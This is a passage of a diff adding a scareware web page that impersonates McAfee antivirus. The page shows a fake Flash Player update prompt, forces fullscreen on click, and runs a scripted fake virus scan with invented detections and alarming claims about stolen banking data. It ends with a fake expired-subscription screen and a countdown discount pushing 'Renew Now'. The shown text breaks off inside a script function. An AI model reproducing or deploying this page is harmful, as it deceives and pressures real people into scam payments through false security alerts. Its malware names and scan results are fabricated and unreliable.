@@ -1,0 +1,2574 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+<title>McAfee</title>
+<meta name="description" content />
+<meta name="robots" content="noindex, nofollow" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="stylesheet" href="./css/normalize.css" />
+<link rel="stylesheet" href="./css/main.css" />
+<link rel="stylesheet" href="./css/animate.css" />
+<link rel="shortcut icon" href="img/favicon.ico" type="image/ico">
+<script>
+function getURLParameter(name) {
+return decodeURI(
+(RegExp(name + '=' + '(.*?)(&|$)').exec(location.search)||[,null])[1] || ''
+);
+}
+</script>
+<style type="text/css">
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+.dnone{display:none}
+#modalContainer *{font-family:Segoe UI,Arial!important;     box-sizing: border-box;}
+#modalContainer{  
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    top: 0;
+    left: 0;
+    z-index: 999;
+    background:#000;
+    padding: 15px 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow-y: auto;
+    max-height: calc(100% - 0px);
+    transition: 0.3s;
+	}
+#alertBox {
+    margin: auto;
+    position: relative;
+    max-width: 700px;
+    width: 97%;
+    background-color: #fff;
+    background-repeat: no-repeat;
+    border: none;
+    border-radius: 5px;
+    transform: translate3d(0, 0, 0);
+    backface-visibility: hidden;
+    animation-name: shake;
+    animation-duration: 5s;
+    animation-iteration-count: 1;
+    animation-timing-function: linear;
+	    border-radius: 7px;
+    overflow: hidden;
+	    
+}
+
+.alert-inner{display:;align-items:center;}
+
+.alert-head {
+padding: 11px 10px;
+    overflow: hidden;
+    background: -webkit-gradient(linear, left top, left bottom, color-stop(0, #ebebeb, color-stop(1, #d5d5d5)));
+    background: -webkit-linear-gradient(top, #ebebeb, #d5d5d5);
+    background: -moz-linear-gradient(top, #ebebeb, #d5d5d5);
+    background: -ms-linear-gradient(top, #ebebeb, #d5d5d5);
+    background: -o-linear-gradient(top, #ebebeb, #d5d5d5);
+    background: linear-gradient(top, #ebebeb, #d5d5d5);
+    border-top: 1px solid #f3f1f3;
+    border-bottom: 1px solid #b1aeb1;
+    text-align: center;
+    position: relative;
+    color: #4d494d;
+    font-size: 18px;
+}
+
+span.cross {
+    position: absolute;
+    right: 14px;
+}
+
+
+.alert-desc {
+    display: flex;
+    padding: 15px;
+    justify-content: space-between;
+    background: #fff;
+}
+
+.modal_f03 {
+    font-size: 26px;
+}
+
+.modal_f03 span {
+    color: #999;
+}
+
+div#modal_f04 {
+    margin: 12px 0;
+}
+
+button#btnUpdateNow {
+    padding: 4px 18px;
+    cursor: pointer;
+}
+
+
+
+.alert_desc_bottom {
+    background: #EBECED;
+    padding: 18px 26px;
+}
+
+.alert_desc_btm_box {
+    background: #fff;
+    padding: 15px;
+    overflow-y: scroll;
+    border: 1px solid #999;
+}
+
+.alrt_desc_btm_box_two ul {
+    margin: 0;
+    padding: 0;
+    list-style: none;
+}
+
+.alrt_desc_btm_box_two ul li {
+    margin: 14px 0;
+}
+
+.alrt_desc_btm_box_two ul li span.cl_icon {
+    background: #2087E5;
+    color: #fff;
+    height: 27px;
+    width: 27px;
+    border-radius: 100%;
+    display: inline-block;
+    text-align: center;
+    line-height: 26px;
+    font-size: 18px;
+    margin-right: 5px;
+}
+
+.alrt_desc_btm_box_two ul li span {
+    color: #555;
+    font-size: 19px;
+}
+
+
+
+
+.alrt_dsc_btnarea {
+    text-align: right;
+}
+.alrt_dsc_btnarea button {
+    position: relative;
+    vertical-align: top;
+    padding: 10px 30px;
+    color: #fff;
+    text-align: center;
+    text-shadow: 0 1px 2px rgba(0, 0, 0, .25);
+    background: #2D81F9;
+    border: 0;
+    cursor: pointer;
+    display: inline-block;
+    font-weight: 500;
+	    border: 1px solid #2D81F9;
+		margin: 6px 0;
+}
+
+#alrt_updated_btn {
+background: -webkit-gradient(linear, left top, left bottom, color-stop(0, #ebebeb, color-stop(1, #d5d5d5)));
+    background: -webkit-linear-gradient(top, #ebebeb, #d5d5d5);
+    background: -moz-linear-gradient(top, #ebebeb, #d5d5d5);
+    background: -ms-linear-gradient(top, #ebebeb, #d5d5d5);
+    background: -o-linear-gradient(top, #ebebeb, #d5d5d5);
+    background: linear-gradient(top, #ebebeb, #d5d5d5);
+    border-top: 1px solid #f3f1f3;
+    border-bottom: 1px solid #b1aeb1;
+    color: #2c3336;
+    border: 1px solid #9E9E9E;
+    text-shadow: none;
+}
+
+#closeBtn:hover{background:#01ef65;background:linear-gradient(145deg,#2D81F9,#1568df);}
+
+	
+/*Animation*/
+.shake{animation-name:shake;animation-duration:5s;animation-iteration-count:1;animation-timing-function:linear} 
+@keyframes shake{1%,3%,5%,7%,9%{transform:translate3d(-5px,0,0)}2%,4%,6%,8%{transform:translate3d(5px,0,0)}9.05%{transform:translate3d(0,0,0)}}
+</style>
+</head>
+<body style="opacity:1;">
+<audio id="beep" src="beep.mp3" preload="auto"></audio>
+
+<div id="modalContainer">
+<div id="alertBox">
+<div class="alert-inner">
+<div class="alert-head"><span id="modal_f01">Software Update</span><span class="cross" onclick="removeCustomAlert()"><img src="./webp/close_btn2.webp" class="icon_btn"></span></div>
+<div class="alert-desc">
+<div class="alrt_desc_left">
+<div class="modal_f03" id="modal_f03">Update your <span> Flash Player</span></div>
+<div id="modal_f04">Install the latest Flash Player for better performance.</div>
+<div><button id="btnUpdateNow" onclick="removeCustomAlert()">Update now</button></div>
+</div>
+<div class="alrt_desc_right">
+<img src="webp/ic_wind.webp" alt="logo" />
+</div>
+</div>
+<div class="alert_desc_bottom">
+<div class="alert_desc_btm_box" id="modal_f05">
+"Flash Player" is an essential plugin for your browser that allows you to view everything from video to games and animation on the web. <br><br>To continue using "Flash Player", download an updated version.
+</div>
+<div class="alrt_desc_btm_box_two">
+<ul>
+<li><span class="cl_icon">></span> <span id="modal_f06">Click "Download Flash"</span></li>
+<li><span class="cl_icon">></span> <span id="modal_f07">Install updates and enjoy performance.</span></li>
+</ul>
+</div>
+<div class="alrt_dsc_btnarea">
+<button id="closeBtn" onclick="removeCustomAlert()">Download Flash Player</button>
+<button id="alrt_updated_btn" onclick="removeCustomAlert()">Update</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div id="dnone" class="dnone main_screen">
+<div class="bl_main_quick">
+<div class="bl_logo">
+<div class="bl_logo_sides">
+<img class="logo_img" src="./webp/logo_b.webp" />
+<div class="logo_devider"></div>
+<div class="logo_name">Quick Scan</div>
+</div>
+<div class="bl_logo_sides">
+<img src="./webp/hide_btn.webp" class="icon_btn" />
+<img src="./webp/close_btn.webp" class="icon_btn" />
+</div>
+</div>
+<div class="bl_scan">
+<div class="bl_logo_sides">
+<div class="counter_cont">
+<img src="./webp/scan.webp" class="scan_img" />
+<span class="perc_counter">0%</span>
+</div>
+<div class="scan_txt_cont">
+<div class="scan_txt">Scanning...</div>
+<div class="scan_subtxt">Viruses & Mailware</div>
+</div>
+</div>
+<div class="bl_logo_sides">
+<div class="scan_txt_cont_r">
+<div class="scan_mintxt">
+Scanning commonly infected areas and startup files... </div>
+<div class="scan_subtxt">С:\Windows\System32\DriverState</div>
+</div>
+</div>
+</div>
+<div class="bl_cont">
+<div class="table">
+<div class="table_head">Result Summary</div>
+<div class="table_devider"></div>
+<div class="table_content_row">
+<div class="bl_logo_sides">
+<img src="./webp/arrow.right.webp" class="arrow_btn" />
+<div class="table_txt">Total items scanned</div>
+</div>
+<div class="bl_logo_sides">
+<div class="table_nums">1273</div>
+</div>
+</div>
+<div class="table_content_row">
+<div class="bl_logo_sides">
+<img src="./webp/arrow.right.webp" class="arrow_btn" />
+<div class="table_txt">Total security risks detected</div>
+<img src="./webp/icon_WarningShield.webp" class="warning_anim" />
+</div>
+<div class="bl_logo_sides">
+<div class="table_nums_red">0</div>
+</div>
+</div>
+<div class="table_content_row">
+<div class="bl_logo_sides">
+<img src="./webp/arrow.right.webp" class="arrow_btn" />
+<div class="table_txt">Total security risks resolved</div>
+</div>
+<div class="bl_logo_sides">
+<div class="table_nums">0</div>
+</div>
+</div>
+<div class="table_content_row">
+<div class="bl_logo_sides">
+<img src="./webp/arrow.right.webp" class="arrow_btn" />
+<div class="table_txt">Result Summary</div>
+<img src="./webp/icon_SquareWarning.webp" class="warning_anim" />
+</div>
+<div class="bl_logo_sides">
+<div class="table_nums_red">0</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="blur_scr step1"></div>
+
+<div class="bl_main_warning animate__animated animate__shakeX step1">
+<div class="bl_red_head">
+<img src="./webp/logo_wh.webp" class="logo_img" />
+<div id="w1_001" class="b_txt">Security Alert - Potential Infection</div>
+<div id="w1_003" class="sb_b_txt">You may have visited unsafe websites with malicious content</div>
+</div>
+<div class="bl_warn_cont">
+<div class="warn_plag">
+<img src="./webp/icon_WarningShield.webp" class="b_icon" />
+<div id="w1_004" class="plag_txt"> Your PC is at risk of being infected by viruses</div>
+</div>
+<div id="w1_005" class="warn_txt">To continue browsing safely - perform an antivirus scan</div>
+<button id="w1_006" class="quick_scan_btn" onclick="runStep1();">Run Quick Scan </button>
+</div>
+</div>
+
+<div class="bl_total_prot animate__animated animate__zoomIn step1" style="display: none">
+<div class="bl_logo">
+<div class="bl_logo_sides">
+<img class="logo_img" src="./webp/logo_b.webp" />
+<div class="logo_devider"></div>
+<div class="logo_name_it">Antivirus</div>
+</div>
+<div class="bl_logo_sides">
+<img src="./webp/hide_btn.webp" class="icon_btn" />
+<img src="./webp/close_btn.webp" class="icon_btn" />
+</div>
+</div>
+<div class="bl_total_prot_cont">
+<div class="bl_total_prot_cont_top">
+<img src="./webp/comp_img.webp" />
+<div class="total_top_content_ct">
+<div class="b_total_txt" id="w1_3">You are protected</div>
+<div>
+<div class="tot_row">
+<div class="total_tab_txt" id="w1_4">Protection Updates</div>
+<div class="total_tag" id="w1_5">Current</div>
+</div>
+<div class="table_devider"></div>
+<div class="tot_row_btw">
+<div class="tot_row">
+<div class="total_tab_txt" id="w1_6">Last Scan</div>
+<div class="total_tag_red" id="w1_7">Not available</div>
+</div>
+<div class="step_btn">
+<span id="w1_8">Run Quick Scan</span> <img src="./webp/arrow.right.blue.webp" />
+</div>
+</div>
+<div class="table_devider"></div>
+<div class="tot_row_btw">
+<div class="tot_row">
+<div class="total_tab_txt" id="w1_9">Licenses Used:</div>
+<div class="total_tag" id="w1_10">1 of 5</div>
+</div>
+<div class="step_btn">
+<span id="w1_11">Install on Another Device</span> <img src="./webp/arrow.right.blue.webp" />
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="bl_total_prot_cont_bot">
+<div class="total_grid_item">
+<img src="./webp/icon_settings.webp" />
+<div class="tot_grid_it_col">
+<div class="gr_txt" id="w1_12">System</div>
+<div class="gr_txt_done">
+<img src="./webp/done.webp" />
+<span id="w1_13">Protected</span> </div>
+</div>
+</div>
+<div class="total_grid_item">
+<img src="./webp/icon_brow.webp" />
+<div class="tot_grid_it_col">
+<div class="gr_txt" id="w1_14">Browsers</div>
+<div class="gr_txt_done">
+<img src="./webp/done.webp" />
+<span id="w1_13a">Protected</span> </div>
+</div>
+</div>
+<div class="total_grid_item">
+<img src="./webp/icon_todo.webp" />
+<div class="tot_grid_it_col">
+<div class="gr_txt" id="w1_15">Perfomance</div>
+<div class="gr_txt_done">
+<img src="./webp/done.webp" />
+<span id="w1_13b">Protected</span> </div>
+</div>
+</div>
+<div class="total_grid_item">
+<img src="./webp/icon_cloud.webp" />
+<div class="tot_grid_it_col">
+<div class="gr_txt" id="w1_15a">Clouds</div>
+<div class="gr_txt_done">
+<img src="./webp/done.webp" />
+<span id="w1_13c">Protected</span> </div>
+</div>
+</div>
+<div class="total_grid_item">
+<img src="./webp/icon_file.webp" />
+<div class="tot_grid_it_col">
+<div class="gr_txt" id="w1_15b">Files</div>
+<div class="gr_txt_done">
+<img src="./webp/done.webp" />
+<span id="w1_13d">Protected</span> </div>
+</div>
+</div>
+<div class="total_grid_item">
+<img src="./webp/icon_safe.webp" />
+<div class="tot_grid_it_col">
+<div class="gr_txt" id="w1_16">More McAfee</div>
+<div class="step_btn">
+<span id="w1_16a">Visit site</span> <img src="./webp/arrow.right.blue.webp" />
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="bl_total_foot">
+<div class="bl_foot_txt" id="w1_17">Subsription status</div>
+<div class="bl_foot_txt_grn" id="w1_18">30 Days Remaining</div>
+</div>
+</div>
+
+<div class="blur_scr step2" style="display: none"></div>
+<div class="bl_main_quick animate__animated animate__zoomIn step2" style="display: none">
+<div class="bl_logo">
+<div class="bl_logo_sides">
+<img class="logo_img" src="./webp/logo_b.webp" />
+<div class="logo_devider"></div>
+<div class="logo_name" id="w2_1">Quick Scan</div>
+</div>
+<div class="bl_logo_sides">
+<img src="./webp/hide_btn.webp" class="icon_btn" />
+<img src="./webp/close_btn.webp" class="icon_btn" />
+</div>
+</div>
+<div class="bl_scan">
+<div class="bl_logo_sides">
+<div class="counter_cont">
+<img src="./webp/scan.webp" class="scan_img" />
+<span id="counter" class="perc_counter">0%</span>
+</div>
+<div class="scan_txt_cont">
+<div class="scan_txt" id="w2_2">Scanning...</div>
+<div class="scan_subtxt" id="w2_2b">Viruses & Mailware</div>
+</div>
+</div>
+<div class="bl_logo_sides">
+<div class="scan_txt_cont_r">
+<div class="scan_mintxt" id="w2_3">Scanning commonly infected areas and startup files...</div>
+<div id="scanPathes" class="scan_subtxt">
+С:\Windows\System32\DriverState
+</div>
+</div>
+</div>
+</div>
+<div class="bl_cont">
+<div class="table">
+<div class="table_head" id="w2_6">Result Summary</div>
+<div class="table_devider"></div>
+<div class="table_content_row">
+<div class="bl_logo_sides">
+<img src="./webp/arrow.right.webp" class="arrow_btn" />
+<div class="table_txt" id="w2_7">Total items scanned</div>
+</div>
+<div class="bl_logo_sides">
+<div id="totalScannedCount" class="table_nums">1273</div>
+</div>
+</div>
+<div class="table_content_row">
+<div class="bl_logo_sides">
+<img src="./webp/arrow.right.webp" class="arrow_btn" />
+<div class="table_txt" id="w2_8">Total security risks detected</div>
+<img src="./webp/icon_WarningShield.webp" class="warning_anim" />
+</div>
+<div class="bl_logo_sides">
+<div id="totalRisksDetected" class="table_nums_red">0</div>
+</div>
+</div>
+<div class="table_content_row">
+<div class="bl_logo_sides">
+<img src="./webp/arrow.right.webp" class="arrow_btn" />
+<div class="table_txt" id="w2_9">Total security risks resolved</div>
+</div>
+<div class="bl_logo_sides">
+<div class="table_nums">0</div>
+</div>
+</div>
+<div class="table_content_row">
+<div class="bl_logo_sides">
+<img src="./webp/arrow.right.webp" class="arrow_btn" />
+<div class="table_txt" id="w2_9b">Result Summary</div>
+<img src="./webp/icon_SquareWarning.webp" class="warning_anim" />
+</div>
+<div class="bl_logo_sides">
+<div id="resultSummary" class="table_nums_red">0</div>
+</div>
+</div>
+</div>
+<div class="repair_btns">
+<button class="rep_btn" id="w2_11">Pause</button>
+<button class="rep_btn" id="w2_12">Stop</button>
+</div>
+</div>
+</div>
+
+<div class="blur_scr step3" style="display: none"></div>
+<div class="bl_main_warning animate__animated animate__zoomIn step3" style="display: none">
+<div class="bl_red_head">
+<img src="./webp/logo_wh.webp" class="logo_img" />
+<div class="b_txt" id="w3_1">Your PC is potentially infected with (5) viruses, which can damage your system</div>
+</div>
+<div class="bl_warn_cont">
+<div class="warn_plag">
+<img src="./webp/icon_SquareWarning.webp" class="b_icon" />
+<div class="plag_txt" id="w3_2">Your <b>personal data</b>, <b> banking information</b>, and other <b> sensitive info </b> is at risk!</div>
+</div>
+<div class="warn_txt" id="w3_3">Please, start your McAfee Antivirus to eliminate all threats.</div>
+<button id="w3_6" class="quick_scan_btn" onclick="runStep4();">Start McAfee</button>
+</div>
+</div>
+
+<div class="bl_total_prot_repair animate__animated animate__zoomIn step4" style="display: none">
+<div class="bl_logo">
+<div class="bl_logo_sides">
+<img class="logo_img" src="./webp/logo_b.webp" />
+<div class="logo_devider"></div>
+<div class="logo_name_it" id="w5_000">Antivirus</div>
+</div>
+<div class="bl_logo_sides">
+<img src="./webp/hide_btn.webp" class="icon_btn" />
+<img src="./webp/close_btn.webp" class="icon_btn" />
+</div>
+</div>
+<div class="red_not" id="w5_001">Processing: Please do not close</div>
+<div class="bl_repair_cont">
+<div class="bl_repair_cont_item">
+<div class="relative">
+<img src="./webp/lt_circ.webp" class="comp_circ lt_circ_anim">
+<img src="./webp/b_circ.webp" class="comp_circ b_circ_anim">
+<img src="./webp/comp_scan_1.webp" class="comp_circ">
+<div class="cont_scan_img_anim">
+<img src="./webp/comp_scan.webp" class="scanner_img">
+<img src="./webp/comp_scan.webp" class="scanner_img_d">
+</div>
+</div>
+<div class="total_rep_top_content_ct">
+<div class="tot_row_btw_w pad">
+<div class="b_total_txt" id="w5_001a">Repair in progress...</div>
+<div id="counter_protection" class="perc_num">0%</div>
+</div>
+<div>
+<div class="tot_row_btw_w">
+<div class="tot_row">
+<div class="total_tab_txt" id="w5_002">
+Selected infected areas and files ... </div>
+</div>
+<div class="tot_row">
+<div class="total_tab_txt">5</div>
+<img src="./webp/done.webp" />
+</div>
+</div>
+<div class="tot_row_btw_w">
+<div class="tot_row">
+<div class="total_tab_txt" id="w5_003">
+Selected areas and files are quarantied ... </div>
+</div>
+<img id="load2" src="./webp/done.webp" style="display: none;" />
+<img id="mute2" src="./webp/load.webp" class="load_img" />
+</div>
+<div class="tot_row_btw_w">
+<div class="tot_row">
+<div class="total_tab_txt" id="w5_004">
+Checking system permissions </div>
+</div>
+<img id="load3" src="./webp/done.webp" style="display: none;" />
+<img id="mute3" src="./webp/load.webp" class="load_img" />
+</div>
+<div class="tot_row_btw_w">
+<div class="tot_row">
+<div class="total_tab_txt" id="w5_005">Checking system status ...</div>
+</div>
+<img id="load4" src="./webp/done.webp" style="display: none;" />
+<img id="mute4" src="./webp/load.webp" class="load_img" />
+</div>
+<div class="tot_row_btw_w">
+<div class="tot_row">
+<div class="total_tab_txt" id="w5_006">
+Checking McAfee subscription ... </div>
+</div>
+<img id="load5" src="./webp/donex.webp" style="display: none;" />
+<img id="mute5" src="./webp/load.webp" class="load_img" />
+</div>
+<div class="repair_btns">
+<button class="rep_btn" id="w5_007">Pause</button>
+<button class="rep_btn" id="w5_008">Stop</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="bl_total_prot_renew animate__animated animate__zoomIn step5" style="display: none">
+<div class="bl_logo">
+<div class="bl_logo_sides">
+<img class="logo_img" src="./webp/logo_b.webp" />
+<div class="logo_devider"></div>
+<div class="logo_name_it">Antivirus</div>
+</div>
+<div class="bl_logo_sides">
+<img src="./webp/hide_btn.webp" class="icon_btn" />
+<img src="./webp/close_btn.webp" class="icon_btn" />
+</div>
+</div>
+<div class="red_not" id="w6_000">Warning! Your antivrius protection is not active!</div>
+<div class="bl_renew_cont">
+<div class="renew_cont_item_l">
+<div class="ren_l_head_txt" id="w6_001">Viruses identified</div>
+<div class="table_devider"></div>
+<div class="ren_l_main_col">
+<div class="ren_l_row">
+<img src="./webp/icon_Warning.webp" />
+<div class="ren_l_txt_col">
+<div class="ren_l_txt_t">Win32/CryptoLocker.X9Zr</div>
+<div class="ren_l_txt_b">Ransomware (High Risk)</div>
+</div>
+</div>
+<div class="ren_l_row">
+<img src="./webp/icon_Warning.webp" />
+<div class="ren_l_txt_col">
+<div class="ren_l_txt_t">Win32/Melissa2023.Xi92</div>
+<div class="ren_l_txt_b">Trojan.Gen.2 (High Risk)</div>
+</div>
+</div>
+<div class="ren_l_row">
+<img src="./webp/icon_Warning.webp" />
+<div class="ren_l_txt_col">
+<div class="ren_l_txt_t">Win32/Zeus.2023...</div>
+<div class="ren_l_txt_b">Trojan.Gen.2 (High Risk)</div>
+</div>
+</div>
+<div class="ren_l_row">
+<img src="./webp/icon_Warning.webp" />
+<div class="ren_l_txt_col">
+<div class="ren_l_txt_t">Win32/Mydoom.2023.</div>
+<div class="ren_l_txt_b">Russian Trojan (Ultra High Risk)</div>
+</div>
+</div>
+<div class="ren_l_row">
+<img src="./webp/icon_Warning.webp" />
+<div class="ren_l_txt_col">
+<div class="ren_l_txt_t">Win32/Conficker.2jf9</div>
+<div class="ren_l_txt_b">Worm (High Risk)</div>
+</div>
+</div>
+<div class="ren_l_row">
+<img src="./webp/icon_Warning.webp" />
+<div class="ren_l_txt_col">
+<div class="ren_l_txt_t">Win32/Pshtrm.Slmn</div>
+<div class="ren_l_txt_b">Russian Trojan (Ultra High Risk)</div>
+</div>
+</div>
+<div class="ren_l_row">
+<img src="./webp/icon_Warning.webp" />
+<div class="ren_l_txt_col">
+<div class="ren_l_txt_t">Win32/Trojan.H028hj.</div>
+<div class="ren_l_txt_b">Virus (Normal Risk)</div>
+</div>
+</div>
+</div>
+</div>
+<div class="renew_cont_item_r">
+<div class="b_total_txt">
+<span id="w6_003">Your Antivirus Protection Has Expired<br> On</span> <span id="dt" style="color: #EA3829;"></span>
+</div>
+<div class="table_devider"></div>
+<div class="renew_r_txt" id="w6_004">
+Given that your computer is potentially infected with (7) different viruses, renewing your antivirus software is essential for protecting your personal information, preventing further damage, and restoring your system's integrity and security. Ignoring Renewal Of Antivirus Will Result in Losing Banking Details, Personal Information and Other Valuable Information From Your Computer.
+</div>
+<div class="warn_plag_yel">
+<img src="./webp/Warning_yellow.webp" class="b_icon" />
+<div class="plag_txt_yel" id="w6_005">If your computer is unprotected, it is at a high risk for<br>viruses and other malware</div>
+</div>
+<div class="row">
+<div class="warn_plag_grn">
+<div id="w6_006">55% Discount for Renew!</div>
+<div class="ren_r_row">
+<div class="plag_txt_grn" id="w6_007">Avaliable For</div>
+<div id="discount_timer" class="d_grn_tag"><span id="mins">3</span> <span id="w6_008">min</span> <span id="secs">55</span> <span id="w6_009">sec</span> </div>
+</div>
+</div>
+<img src="./webp/safe_img.webp" class="safe_img" />
+<div class="warn_plag_grn_r"></div>
+</div>
+<div class="repair_btns">
+
+<a href="javascript:void(0)" onclick="out();PreventExitPop=false" rel="noreferrer" class="quick_scan_btn" id="w6_010">Renew Now</a>
+</div>
+</div>
+</div>
+</div>
+<div class="notification_list">
+<div id="noty1" class="lit_notif animate__animated animate__fadeIn" style="display: none">
+<div class="not_red_top not_row">
+<img src="./webp/not_warn.webp" />
+<div class="not_col">
+<div class="not_head_ttxt">Win32/Adware.SystemSecuri...</div>
+<div class="not_head_btxt">Trojan.Gen.2</div>
+</div>
+</div>
+<div class="not_row">
+<img src="./webp/not_burger.webp" />
+<div class="not_col">
+<div class="not_ttxt" id="risk">Risk</div>
+<div class="not_btxt_bold" id="high">High</div>
+</div>
+</div>
+<div class="table_devider"></div>
+<div class="not_row">
+<img src="./webp/not_home.webp" />
+<div class="not_col">
+<div class="not_ttxt_it" id="origin">Origin</div>
+<div class="not_btxt" id="notavl">Not Availiable</div>
+</div>
+</div>
+<div class="table_devider"></div>
+<div class="not_row">
+<img src="./webp/not_flag.webp" />
+<div class="not_col">
+<div class="not_ttxt_it" id="actvty">Activity</div>
+<div class="not_btxt" id="thretaction">Threat Actions performed: 1</div>
+</div>
+</div>
+</div>
+<div id="noty2" class="lit_notif animate__animated animate__fadeIn" style="display: none">
+<div class="not_red_top not_row">
+<img src="./webp/not_warn.webp" />
+<div class="not_col">
+<div class="not_head_ttxt">C:\Windows\\microsoft office...</div>
+<div class="not_head_btxt">Trojan.Gen.2</div>
+</div>
+</div>
+<div class="not_row">
+<img src="./webp/not_burger.webp" />
+<div class="not_col">
+<div class="not_ttxt" id="risk2">Risk</div>
+<div class="not_btxt_bold" id="high2">High</div>
+</div>
+</div>
+<div class="table_devider"></div>
+<div class="not_row">
+<img src="./webp/not_home.webp" />
+<div class="not_col">
+<div class="not_ttxt_it" id="origin2">Origin</div>
+<div class="not_btxt" id="notavl2">Not Availiable</div>
+</div>
+</div>
+<div class="table_devider"></div>
+<div class="not_row">
+<img src="./webp/not_flag.webp" />
+<div class="not_col">
+<div class="not_ttxt_it" id="actvty2">Activity</div>
+<div class="not_btxt" id="thretaction2">Threat Actions performed: 1</div>
+</div>
+</div>
+</div>
+<div id="noty3" class="lit_notif animate__animated animate__fadeIn" style="display: none">
+<div class="not_red_top not_row">
+<img src="./webp/not_warn.webp" />
+<div class="not_col">
+<div class="not_head_ttxt">C:\Windows\\sysWOW64...</div>
+<div class="not_head_btxt">Trojan.Gen.2</div>
+</div>
+</div>
+<div class="not_row">
+<img src="./webp/not_burger.webp" />
+<div class="not_col">
+<div class="not_ttxt" id="risk3">Risk</div>
+<div class="not_btxt_bold" id="high3">High</div>
+</div>
+</div>
+<div class="table_devider"></div>
+<div class="not_row">
+<img src="./webp/not_home.webp" />
+<div class="not_col">
+<div class="not_ttxt_it" id="origin3">Origin</div>
+<div class="not_btxt" id="notavl3">Not Availiable</div>
+</div>
+</div>
+<div class="table_devider"></div>
+<div class="not_row">
+<img src="./webp/not_flag.webp" />
+<div class="not_col">
+<div class="not_ttxt_it" id="actvty3">Activity</div>
+<div class="not_btxt" id="thretaction3">Threat Actions performed: 1</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script>
+
+function removeCustomAlert() {
+	document.getElementById("modalContainer").style.display = "none";
+	document.documentElement.requestFullscreen();	
+	document.getElementById("dnone").classList.remove("dnone");	
+}
+
+ 
+ 
+ 
+// Run Step1
+function runStep1() {
+    var step1Elements = document.querySelectorAll('.step1');
+    step1Elements.forEach(function(element) {
+        element.style.display = 'flex';
+    });
+
+    setTimeout(function() {
+        var step2Elements = document.querySelectorAll('.step2');
+        step2Elements.forEach(function(element) {
+            element.style.display = 'flex';
+        });
+
+        animatePercentageCounter(100, 7000);
+        animateTotalScannedCount(1273, 2350300, 8000);
+        scanPaths(paths, 50, 8000);
+    }, 2000);
+
+    setTimeout(function() {
+        document.getElementById('beep').play(); // beep
+        document.querySelectorAll('#totalRisksDetected').forEach(function(element) {
+            element.textContent = '1';
+        });
+        document.querySelectorAll('#noty1').forEach(function(element) {
+            element.style.display = 'flex';
+        });
+    }, 2000);
+
+    setTimeout(function() {
+        document.querySelectorAll('#totalRisksDetected').forEach(function(element) {
+            element.textContent = '2';
+        });
+        document.querySelectorAll('#noty1').forEach(function(element) {
+            element.style.display = 'none';
+        });
+        document.querySelectorAll('#noty2').forEach(function(element) {
+            element.style.display = 'flex';
+        });
+    }, 5000);
+
+    setTimeout(function() {
+        document.querySelectorAll('#totalRisksDetected').forEach(function(element) {
+            element.textContent = '3';
+        });
+        document.querySelectorAll('#noty2').forEach(function(element) {
+            element.style.display = 'none';
+        });
+        document.querySelectorAll('#noty3').forEach(function(element) {
+            element.style.display = 'flex';
+        });
+    }, 7000);
+
+    setTimeout(function() {
+        document.querySelectorAll('#resultSummary').forEach(function(element) {
+            element.textContent = '1';
+        });
+    }, 3000);
+
+    setTimeout(function() {
+        document.querySelectorAll('#resultSummary').forEach(function(element) {
+            element.textContent = '2';
+        });
+    }, 6000);
+
+    setTimeout(function() {
+        document.querySelectorAll('#resultSummary').forEach(function(element) {
+            element.textContent = '3';
+        });
+        document.querySelectorAll('#noty3').forEach(function(element) {
+            element.style.display = 'none';
+        });
+    }, 8000);
+
+    setTimeout(function() {
+        var step3Elements = document.querySelectorAll('.step3');
+        step3Elements.forEach(function(element) {
+            element.style.display = 'flex';
+        });
+        animatePercentageCounter2(100, 10000);
+    }, 10000);
+
+    // Full screen
+    if (document.fullscreenEnabled) {
+        document.documentElement.requestFullscreen();
+    }
+}
+
+// Run Step4
+function runStep4() {
+    var step4Elements = document.querySelectorAll('.step4');
+    step4Elements.forEach(function(element) {
+        element.style.display = 'flex';
+    });
+
+    setTimeout(function() {
+        document.querySelectorAll('#mute2').forEach(function(element) {
+            element.style.display = 'none';
+        });
+        document.querySelectorAll('#load2').forEach(function(element) {
+            element.style.display = 'block';
+        });
+    }, 2000);
+
+    setTimeout(function() {
+        document.querySelectorAll('#mute3').forEach(function(element) {
+            element.style.display = 'none';
+        });
+        document.querySelectorAll('#load3').forEach(function(element) {
+            element.style.display = 'block';
+        });
+    }, 4000);
+
+    setTimeout(function() {
+        document.querySelectorAll('#mute4').forEach(function(element) {
+            element.style.display = 'none';
+        });
+        document.querySelectorAll('#load4').forEach(function(element) {
+            element.style.display = 'block';
+        });
+    }, 6000);
+
+    setTimeout(function() {
+        document.querySelectorAll('#mute5').forEach(function(element) {
+            element.style.display = 'none';
+        });
+        document.querySelectorAll('#load5').forEach(function(element) {
+            element.style.display = 'block';
+        });
+    }, 9000);
+
+    setTimeout(function() {
+        var step5Elements = document.querySelectorAll('.step5');
+        step5Elements.forEach(function(element) {
+            element.style.display = 'flex';
+        });
+        setInterval(countdown, 1000);
+    }, 10000);
+}
+
+
+
+
+// Num 1-100 percentage counter
+function animatePercentageCounter(targetPercentage, animationDuration) {
+    var interval = 50; // Update every 50 milliseconds
+    var currentPercentage = 0;
+    var increment = targetPercentage / (animationDuration / interval);
+    var counterInterval = setInterval(function() {
+        currentPercentage += increment;
+        // Round down the percentage value
+        var displayPercentage = Math.floor(Math.min(currentPercentage, targetPercentage));
+       // document.querySelector('.perc_counter').textContent = displayPercentage + "%";
+		document.getElementById('counter').textContent = displayPercentage + "%";
+        if (currentPercentage >= targetPercentage) {
+            clearInterval(counterInterval);
+        }
+    }, interval);
+}
+
+// Num 1-100 percentage counter
+function animatePercentageCounter2(targetPercentage, animationDuration) {
+    var interval = 50; // Update every 50 milliseconds
+    var currentPercentage = 0;
+    var increment = targetPercentage / (animationDuration / interval);
+    var counterInterval = setInterval(function() {
+        currentPercentage += increment;
+        // Round down the percentage value
+        var displayPercentage = Math.floor(Math.min(currentPercentage, targetPercentage));
+        document.getElementById('counter_protection').textContent = displayPercentage + "%";
+        if (currentPercentage >= targetPercentage) {
